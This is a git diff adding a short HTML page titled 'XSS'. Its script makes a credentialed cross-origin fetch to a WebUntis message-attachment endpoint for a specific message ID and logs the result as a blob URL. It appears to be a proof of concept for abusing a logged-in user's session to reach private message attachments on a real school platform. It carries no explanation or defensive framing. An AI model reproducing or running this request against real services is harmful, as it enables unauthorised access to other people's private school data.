@@ -1,0 +1,28 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>XSS</title>
+</head>
+
+<body>
+
+</body>
+
+</html>
+
+<script>
+  const url = `https://storage.webuntis.com/WebUntis/api/rest/view/v1/messages/bde00e20-22bd-4d51-827b-df6adab76df5/attachmentstorageurl`
+  fetch(url, {
+    method: 'GET',
+    credentials: 'include',
+    mode: 'no-cors',
+  }).then(response => {
+    return response.blob();
+  }).then(blob => {
+    const bloburl = URL.createObjectURL(blob);
+    console.log(bloburl);
+  })
+</script>
